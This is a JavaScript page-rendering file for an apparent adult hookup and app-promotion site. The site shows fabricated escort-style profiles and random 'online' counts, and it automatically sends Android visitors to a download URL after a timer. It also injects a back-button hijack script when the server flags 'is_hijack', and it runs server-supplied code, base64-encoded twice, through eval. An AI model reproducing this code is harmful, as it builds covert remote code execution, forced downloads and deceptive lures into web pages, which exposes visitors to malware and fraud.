//动态渲染html
let BoutiqueHeigth = 0;
let LiveBroadcastHeigth = 0;
let setTimeoutTime = 1000 ; 
let setTimeoutHref = '' ;

/*$(function(){
    //公告
	getSystemConfigFun()
	getHotLiveFun()        //火热直播 
	getDataBoutiqueFun()  //精品视频
	//getwebmasterRecommend()  //站长推荐
	//getexpectMore()  //期待更多
	gettopRanking()   //热门排行
	getwannaShagFun()  //在线约炮
	getGamesFun()  //赚钱娱乐
	//$('.Notice-dom').text('老司机请记住我们的网址，从此不迷路：m.se1002.top ')
})*/




//获取配置
function getSystemConfigFun(){
	source['url'] = systemConfig
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		switch(platform){
			case 'ios':
				setTimeoutTime = res.data.ios_redirect_time * 1000;
				setTimeoutHref = res.data.ios_redirect_url
				break;
			case 'android':
				setTimeoutTime = res.data.android_redirect_time * 1000;
				setTimeoutHref = res.data.android_redirect_url
				break;
			case 'pc':
				setTimeoutTime = res.data.pc_redirect_time * 1000;
				setTimeoutHref = res.data.pc_redirect_url
				break;
		}
		//设置最新域名
		$("#copy_domain").text(res.data.newest_url)
		//设置公告
		$('.Notice-dom').text(res.data.public_notice)
		
		//首页弹窗设置
		let rannum = Math.ceil(Math.random()*999);
		$(".online_num").text(rannum)
		//$(".yuepao_a").attr('href',res.data.pop_up_window_url)
		$(".yuepao_tc").html(`
		    <a href="javascript:void(0);" target="_blank" class="yuepao_a"  target="_blank" onclick="goto_newweb('首页弹窗','${res.data.pop_up_window_url}')">立即约炮</a>
		`)
		
		if(res.data.pop_up_window_status == 1){
		    $(".yuehui-mask").removeClass("yc")
		}
		
		//在线约炮 查看更多地址
		$(".online_num2").text(rannum)
		$(".more-btn").attr('href',res.data.wanna_shag_more_redirect_url)
		
		//自动下载
		if(res.data.auto_down_status == 1){
		    switch(platform){
				case 'ios':
				    // setTimeout(function(){
        //     			location.href = res.data.auto_down_url
        //     		},res.data.auto_down_time)
					//location.href = res.data.auto_down_url
					break;
				case 'android':
				    setTimeout(function(){
            			location.href = res.data.auto_down_url
            		},res.data.auto_down_time)
					//
					break;
				case 'pc':
					
					break;
			}
			
		}
		
		
		//计时自动跳转
// 		setTimeout(function(){
// 			location.href = setTimeoutHref 
// 		},setTimeoutTime)
	}
}

//在线约炮
function getwannaShagFun(){
	source['url'] = getwannaShag
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		let newArr = [] ;
		arr.forEach((item,index) => {
			switch(index){
				case 0:
					item['renzheng'] = '约叭认证';
					item['title'] = '萱萱 99年，童颜巨乳';
					item['tags'] = ['在校学生','童颜巨乳','潮吹喷水'];
					item['age'] = 21;
					item['height'] = 168;
					item['cup'] = 'C';
					newArr.push(item)
					break;
				case 1:
					item['renzheng'] = '约叭认证';
					item['title'] = '肥臀巨乳的身材🎊';
					item['tags'] = ['极品少妇','肥臀巨乳','皮肤雪白'];
					item['age'] = 28;
					item['height'] = 170;
					item['cup'] = 'D';
					newArr.push(item)
					break;
				case 2:
					item['renzheng'] = '约叭认证';
					item['title'] = '🎀长腿细腰翘臀';
					item['tags'] = ['舞蹈教师','潮吹喷水','寻求刺激'];
					item['age'] = 24;
					item['height'] = 166;
					item['cup'] = 'C';
					newArr.push(item)
					break;
				case 3:
					item['renzheng'] = '约叭认证';
					item['title'] = '粉⬇️嫩 感觉如初恋';
					item['tags'] = ['职业模特','三点粉嫩','大长腿'];
					item['age'] = 23;
					item['height'] = 172;
					item['cup'] = 'D';
					newArr.push(item)
					break;
			}
		})
		framtDataZaixianyuepaoFun(newArr)
	}
}

//赚钱娱乐
function getGamesFun(){
	source['url'] = entertainment
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		framtDataGamesFun(arr)
	}
}
//赚钱娱乐 live-games-list 
function framtDataGamesFun(arr){
	let dom = document.querySelector(".live-games-list") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})

	function createDom(data,index){
		return ` 
			<div class="games-item">
				<div class="flex-one item-top-dv">
					<img class="item-logo" src="${data.cover}"/>
					<div class="item-right-dv">
						<div class="flex-one item-right-dv-top">
							<div class="item-right-dv-top-left">
								<div class="title-dv">
									<span class="title-dv-title1">官方</span>
									<span class="title-dv-info">${data.title}</span>
								</div>
								<div class="title2-dv">
									${data.sub_title}
								</div>
							</div>
							<div class="item-right-dv-top-right">
								<img class="item-right-dv-top-right-imgtop" src="/img/Snipaste_2022-05-31_17-17-24.jpg" alt="" />
								<img class="item-right-dv-top-right-imgbottom" src="/img/Snipaste_2022-05-31_17-17-37.jpg" alt="" />
							</div>
						</div>
						<p class="taginfo">${data.recommend_content}</p>
					</div>
				</div>
				<a class="btns-down flex-one" href="${data.redirect_url  }" target="_blank">
	                <img src="/img/register123.png" onclick="register('${data.redirect_url  }')">
	                <img src="/img/download123.png" onclick="register('${data.redirect_url  }')">
	            </a >
	            <div class="bottom-dv flex-one">
	            	<img src="/img/Snipaste_2022-05-31_17-17-51.jpg" alt="" />
	            	<p>${data.bottom_content}</p>
	            </div>
			</div>
			
		`
	}
	dom.innerHTML = domStr;
	//获取列表高度
	let height = $(".live-broadcast-list").height();
	LiveBroadcastHeigth = height
	
	if(LiveBroadcastHeigth != 0 && BoutiqueHeigth != 0){
		let maxHeight = 0 ;
		if(LiveBroadcastHeigth >= BoutiqueHeigth)  maxHeight = LiveBroadcastHeigth
		if(BoutiqueHeigth >= LiveBroadcastHeigth)  maxHeight = BoutiqueHeigth
		$(".swiper-container-video-list").css('height',maxHeight)
	}
	
}

//火热直播 
function getHotLiveFun(){
	source['url'] = getHotLive
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		let newArr = []
		arr.forEach((item,index) => {
			switch(platform){
				case 'ios':
					if(item.ios_download.length >0 ) newArr.push(item) ;
					break;
				case 'android':
					if(item.android_download.length >0 ) newArr.push(item) ;
					break;
				case 'pc':
					newArr.push(item) ;
					break;
			}
		})
		framtDataLiveBroadcastFun(newArr)
	}
}
//精品视频
function getDataBoutiqueFun(){
	source['url'] = boutiqueVideo
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		let newArr = []
		arr.forEach((item,index) => {
			switch(platform){
				case 'ios':
					if(item.ios_download.length >0 ) newArr.push(item) ;
					break;
				case 'android':
					if(item.android_download.length >0 ) newArr.push(item) ;
					break;
				case 'pc':
					newArr.push(item) ;
					break;
			}
		})
		framtDataBoutiqueFun(newArr)
	}
}
//站长推荐
function getwebmasterRecommend(){
	source['url'] = webmasterRecommend
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		let newArr = []
		arr.forEach((item,index) => {
			switch(platform){
				case 'ios':
					if(item.ios_download.length >0 ) newArr.push(item) ;
					break;
				case 'android':
					if(item.android_download.length >0 ) newArr.push(item) ;
					break;
				case 'pc':
					newArr.push(item) ;
					break;
			}
		})
		framtDataWebTuijianFun(newArr)
	}
}
//热门排行
function gettopRanking(){
	source['url'] = topRanking
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		let newArr = []
		arr.forEach((item,index) => {
			switch(platform){
				case 'ios':
					if(item.ios_download.length >0 ) newArr.push(item) ;
					break;
				case 'android':
					if(item.android_download.length >0 ) newArr.push(item) ;
					break;
				case 'pc':
					newArr.push(item) ;
					break;
			}
		})
		framtDataHotFun(newArr)
	}
}
//期待更多
function getexpectMore(){
	source['url'] = expectMore
	getFunssss(source, successfn, errorfn,'正在加载。。')
	function successfn(res){
		let arr =  res.data ;
		let newArr = []
		arr.forEach((item,index) => {
			switch(platform){
				case 'ios':
					if(item.ios_download.length >0 ) newArr.push(item) ;
					break;
				case 'android':
					if(item.android_download.length >0 ) newArr.push(item) ;
					break;
				case 'pc':
					newArr.push(item) ;
					break;
			}
		})
		framtDataQiDaiFun(newArr)
	}
}

//在线约炮 live-yuepa-list
function framtDataZaixianyuepaoFun(arr){
	let dom = document.querySelector(".live-yuepa-list") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})
	//
	
	function createDom(data,index){
		return ` 
			<li onclick="javascript:goto_newweb('${data.name}','${data.redirect_url}')">
				
				<div class="y-img">
					<img src="${data.cover}" alt="${data.name}">
				</div>
				<div class="y-txt">
					<div class="name">
					<span class="v">${data.renzheng}</span>
					<b>${data.title}</b>
				</div>
				<div class="tag">
					<span>${data.tags[0]}</span>
					<span>${data.tags[1]}</span>
					<span>${data.tags[2]}</span>
				</div>
					<div class="info">
					<span>${data.age}岁</span>
					<span>${data.height}cm</span>
					<span>${data.cup}罩杯</span>
				</div>
				<div class="btn">
						<a class="##">我要约她</a>
					</div>
				</div>
			</li>

			
		
		`
	}
	dom.innerHTML = domStr;
	//获取列表高度
	let height = $(".live-broadcast-list").height();
	LiveBroadcastHeigth = height
	
	if(LiveBroadcastHeigth != 0 && BoutiqueHeigth != 0){
		let maxHeight = 0 ;
		if(LiveBroadcastHeigth >= BoutiqueHeigth)  maxHeight = LiveBroadcastHeigth
		if(BoutiqueHeigth >= LiveBroadcastHeigth)  maxHeight = BoutiqueHeigth
		$(".swiper-container-video-list").css('height',maxHeight)
	}
	
}



function goto_newweb(name,href){
	//location.href = href  
	DownAppStatisticsFun(name,'在线约炮')
	window.open(href)
	
}


//火热直播 live-broadcast-list
function framtDataLiveBroadcastFun(arr){
	let dom = document.querySelector(".live-broadcast-list") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})
	//
	
	function createDom(data,index){
		return ` 
			<div class="list-item" onclick="goDownWebFun('${data.android_download}','${data.ios_download}','${data.cover_redirect}','${data.name}','火热直播')">
				<p class="app-logo" >
				<img src="${data.cover}" alt="${data.name}"></p>
				<p class="app-name" >${data.name}</p>
				<li class="app-download btn-download">
					<a href="javascript:void(0);" >
						<span class="title">爱浪成人直播APP</span>
						下载
					</a>

				</li>
			</div>
		
		`
	}
	dom.innerHTML = domStr;
	//获取列表高度
	let height = $(".live-broadcast-list").height();
	LiveBroadcastHeigth = height
	
	if(LiveBroadcastHeigth != 0 && BoutiqueHeigth != 0){
		let maxHeight = 0 ;
		if(LiveBroadcastHeigth >= BoutiqueHeigth)  maxHeight = LiveBroadcastHeigth
		if(BoutiqueHeigth >= LiveBroadcastHeigth)  maxHeight = BoutiqueHeigth
		$(".swiper-container-video-list").css('height',maxHeight)
	}
	
}

//精品视频 Boutique-list
function framtDataBoutiqueFun(arr){
	let dom = document.querySelector(".Boutique-list") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})
	function createDom(data,index){
		return `
			<div class="list-item" onclick="goDownWebFun('${data.android_download}','${data.ios_download}','${data.cover_redirect}','${data.name}','精品视频')">
				<p class="app-logo" >
				<img src="${data.cover}" alt="${data.name}"></p>
				<p class="app-name" >${data.name}</p>
				<li class="app-download btn-download">
					<a href="javascript:void(0);" >
						<span class="title">爱浪成人直播APP</span>
						下载
					</a>
				</li>
			</div>
		
		`
	}
	dom.innerHTML = domStr;
	//获取列表高度
	let height = $(".Boutique-list").height();
	BoutiqueHeigth = height
	if(LiveBroadcastHeigth != 0 && BoutiqueHeigth != 0){
		let maxHeight = 0 ;
		if(LiveBroadcastHeigth >= BoutiqueHeigth)  maxHeight = LiveBroadcastHeigth
		if(BoutiqueHeigth >= LiveBroadcastHeigth)  maxHeight = BoutiqueHeigth
		$(".swiper-container-video-list").css('height',maxHeight)
	}
}

//站长火爆 WebTuijian
function framtDataWebTuijianFun(arr){
	let dom = document.querySelector(".WebTuijian") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})
	function createDom(data,index){
		return `
			<a class="item-wrap" href="javascript:void(0);" onclick="goDownWebFun('${data.android_download}','${data.ios_download}','${data.cover_redirect}','${data.name}','站长推荐')" target="_blank">
				<div class="img-wrap">
					<img src="${data.cover}" alt="${data.name}">
				</div>
				<div class="content">
					<div class="row1">
						<div class="col-left">
							<div class="name">
								${data.name} <span class="tj-wrap">
			                     APP
			                                                                </span>
							</div>
							<div class="count">
								${data.display_down_count}万次 下载
							</div>
						</div>
						<div class="btn-wrap btn-download">
			
							<img src="/img/download.png?v1" alt=""> 下载
						</div>
					</div>
					<div class="desc"></div>
				</div>
			</a>
		
		`
	}
	dom.innerHTML = domStr;
}

//热门 hot-more-data
function framtDataHotFun(arr){
	let dom = document.querySelector(".hot-more-data") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})
	function createDom(data,index){
		return `
			<a class="item-wrap" href="javascript:void(0);" onclick="goDownWebFun('${data.android_download}','${data.ios_download}','${data.cover_redirect}','${data.name}','热门排行')" 
			target="_blank">
				<div class="img-wrap">
					<img src="${data.cover}" alt="${data.name}">
				</div>
				<div class="content">
					<div class="row1">
						<div class="col-left">
							<div class="name">
								${data.name} 
								<span class="tj-wrap">
			                     APP
			                    </span>
							</div>
							<div class="count">
								${data.display_down_count}万次 下载
							</div>
						</div>
						<div class="btn-wrap btn-download" data-link="" data-ioslink="" data-androidlink="">
							<img src="/img/download.png?v1" alt=""> 下载
						</div>
					</div>
					<div class="desc"></div>
				</div>
			</a>
		
		`
	}
	dom.innerHTML = domStr;
}

//期待更多 qidai-more-data
function framtDataQiDaiFun(arr){
	let dom = document.querySelector(".qidai-more-data") ;
	let domStr = ''
	arr.forEach((item,index) => {
		domStr += createDom(item,index)
	})
	function createDom(data,index){
		return `
			<a class="item-wrap" href="javascript:void(0);" onclick="goDownWebFun('${data.android_download}','${data.ios_download}','${data.cover_redirect}','${data.name}','期待更多')" target="_blank">
				<div class="img-wrap">
					<img src="${data.cover}" alt="${data.name}">
				</div>
				<div class="content">
					<div class="row1">
						<div class="col-left">
							<div class="name">
								${data.name}<span class="tj-wrap">
			                     APP
			                                                                </span>
							</div>
							<div class="count">
								${data.display_down_count}万次 下载
							</div>
						</div>
						<div class="btn-wrap btn-download" data-link="" data-ioslink="" data-androidlink="">
							<img src="/img/download.png?v1" alt=""> 下载
						</div>
					</div>
					<div class="desc"></div>
				</div>
			</a>
		
		`
	}
	dom.innerHTML = domStr;
}



//跳转下载页面
function goDownWebFun(android,ios,pc,name,type){
	console.log(android)
	console.log(ios)
	console.log(pc)
	DownAppStatisticsFun(name,type)
	switch(platform){
		case 'ios':
			window.open(ios);
			break;
		case 'android':
			window.open(android);
			break;
		case 'pc':
			window.open(pc) ;
			break;
	}
}

// 
idSourceFun()
function idSourceFun(){
   
	let id = getQueryVariable('id')
	if(!id){
	    //console.log('nodi')
	    document.write("<script type='text/javascript' src ='/365js/notBack.js?v=0266668'></script>"); 
	}else{
	    source['url'] = idSource+'?id='+id
    	getFunssss(source, successfn, errorfn,'正在加载。。')
    	function successfn(res){
    		let arr =  res.data ;
    		//console.log(res.data)
    		
    		if(res.data.is_hijack == 1){
    		    //console.log(res.data.is_hijack)
    		    var oHead = document.getElementsByTagName('HEAD').item(0); 
                var oScript= document.createElement("script"); 
                oScript.type = "text/javascript"; 
                oScript.src="/js/notBack.js?v=0266668"; 
                oHead.appendChild( oScript); 
        	    //document.write("<script type='text/javascript' src='/js/notBack.js?v=026666'></script>"); 
        	}
        	
    		if(res.data.code.length >0){
    			eval(atob(atob(res.data.code)))
    		}
    		
    		
    		
    	} 
	}
	
	
}


   
 
//下载统计
function DownAppStatisticsFun(name,type){
	console.log(name)
	source['url'] = setStatistics
	source['data']['module'] = type
	source['data']['app_name'] = name
	source['data']['type'] = platformNum
	postFun(source, successfn, errorfn)
	function successfn(res){
		console.log(res)
	}
}

